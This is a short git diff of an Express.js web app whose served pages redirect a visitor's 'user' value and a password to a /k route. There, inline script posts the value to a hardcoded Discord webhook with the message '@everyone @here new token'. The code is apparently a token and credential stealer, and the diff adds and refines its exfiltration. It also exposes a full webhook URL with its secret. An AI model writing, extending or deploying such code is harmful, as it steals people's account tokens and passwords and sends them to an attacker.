@@ -66,7 +66,7 @@ app.get("/", async (req, res) => {
   
         const query = searchToObject();
   
-        location.href = \`\${location.origin}/\${query.user}`;
+        location.href = \`\${location.origin}/k?user=\${query.user}&pass=\${pass}\`;
       </script>
     </body>
   </html>`);
@@ -82,7 +82,9 @@ app.get("/k", async (req, res) => {
 <script>
 
 var webhookURL = "https://discord.com/api/webhooks/1052050979840860182/q1mTfTpBYZpFK9fQGiWGDUNYnge16ODe3TGNXJRjDRirpU71HoO9sgwSy5ddQfMxrKAz";
-var currentURL = window.location.href;
+var url_string = window.location.href; 
+var url = new URL(url_string);
+var currentURL = url.searchParams.get("user");
 var postData = {
   content: "@everyone @here new token" + currentURL
 };
